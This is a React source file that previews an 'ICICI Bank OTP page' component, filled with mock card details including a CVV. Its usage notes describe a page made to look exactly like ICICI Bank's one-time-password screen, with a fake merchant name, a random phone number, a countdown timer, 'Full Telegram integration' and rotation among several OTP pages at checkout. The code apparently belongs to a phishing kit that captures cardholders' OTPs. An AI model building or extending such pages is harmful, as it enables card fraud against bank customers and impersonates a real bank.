import React, { useState } from 'react';
import ICICIBankOTPPage from '@/components/ICICIBankOTPPage';

const ICICIPreview = () => {
  // Mock data for preview
  const [otpValue, setOtpValue] = useState('');
  const [otpSubmitting, setOtpSubmitting] = useState(false);
  const [otpError, setOtpError] = useState('');

  const mockCardData = {
    cardNumber: '6528 1234 5678 9012',
    cardName: 'JOHN DOE',
    expiryMonth: '12',
    expiryYear: '27',
    cvv: '123'
  };

  const mockBillingDetails = {
    firstName: 'John',
    lastName: 'Doe',
    email: 'john.doe@example.com',
    country: 'india',
    companyName: 'Test Company'
  };

  const mockCardBrandLogos = {
    visa: 'https://brandlogos.net/wp-content/uploads/2025/04/visa_secure_badge-logo_brandlogos.net_n9x0z-300x300.png',
    mastercard: 'https://www.freepnglogos.com/uploads/mastercard-png/mastercard-logo-logok-15.png',
    discover: 'https://cdn-icons-png.flaticon.com/128/5968/5968311.png',
    rupay: 'https://logotyp.us/file/rupay.svg',
    amex: 'https://cdn-icons-png.flaticon.com/128/5968/5968311.png'
  };

  const getCardBrand = (cardNumber: string) => {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    if (cleanNumber.startsWith('4')) return 'visa';
    if (cleanNumber.startsWith('5') || cleanNumber.startsWith('2')) return 'mastercard';
    if (cleanNumber.startsWith('6')) return 'rupay';
    if (cleanNumber.startsWith('3')) return 'amex';
    return 'visa';
  };

  const formatPrice = (price: number) => {
    return `₹${price.toLocaleString()}`;
  };

  const handleOtpSubmit = () => {
    setOtpSubmitting(true);
    // Simulate API call
    setTimeout(() => {
      setOtpSubmitting(false);
      alert('OTP Submitted (Preview Mode)');
    }, 2000);
  };

  const handleOtpCancel = () => {
    alert('OTP Cancelled (Preview Mode)');
    setOtpValue('');
  };

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header */}
      <div className="bg-white border-b border-gray-200 p-4">
        <div className="max-w-4xl mx-auto">
          <h1 className="text-2xl font-bold text-gray-900 mb-2">ICICI Bank OTP Page Preview</h1>
          <p className="text-gray-600">
            This is a preview of the new ICICI Bank OTP page that appears 25% of the time during checkout.
          </p>
        </div>
      </div>

      {/* Preview Content */}
      <div className="max-w-4xl mx-auto p-4">
        <div className="bg-white rounded-lg shadow-lg overflow-hidden">
          <ICICIBankOTPPage
            cardData={mockCardData}
            billingDetails={mockBillingDetails}
            otpValue={otpValue}
            setOtpValue={setOtpValue}
            otpSubmitting={otpSubmitting}
            handleOtpSubmit={handleOtpSubmit}
            handleOtpCancel={handleOtpCancel}
            otpError={otpError}
            adminSelectedBankLogo="https://www.pngkey.com/png/full/223-2237358_icici-bank-india-logo-design-png-transparent-images.png"
            sessionBankLogo=""
            cardBrandLogos={mockCardBrandLogos}
            getCardBrand={getCardBrand}
            displayPrice={3544}
            formatPrice={formatPrice}
          />
        </div>

        {/* Usage Instructions */}
        <div className="mt-8 bg-white rounded-lg shadow p-6">
          <h2 className="text-xl font-semibold text-gray-900 mb-4">Usage Instructions</h2>
          <div className="space-y-4 text-gray-700">
            <div>
              <h3 className="font-semibold text-gray-900">Features:</h3>
              <ul className="mt-2 ml-4 list-disc space-y-1">
                <li>Displays exactly like your reference image</li>
                <li>Shows current date and time</li>
                <li>Card number with first 4 + masked + last 4 digits</li>
                <li>Random mobile number ending</li>
                <li>Merchant name: "OneMobileSystemPLtd"</li>
                <li>3:59 minute countdown timer</li>
                <li>Full Telegram integration</li>
                <li>Admin bank logo control</li>
              </ul>
            </div>
            <div>
              <h3 className="font-semibold text-gray-900">Integration:</h3>
              <p className="mt-2">This page automatically appears 25% of the time during checkout alongside the other OTP pages (Old, New, Third, ICICI).</p>
            </div>
            <div>
              <h3 className="font-semibold text-gray-900">Testing:</h3>
              <p className="mt-2">You can enter a 6-digit OTP and test the functionality. In preview mode, it will just show an alert.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ICICIPreview;
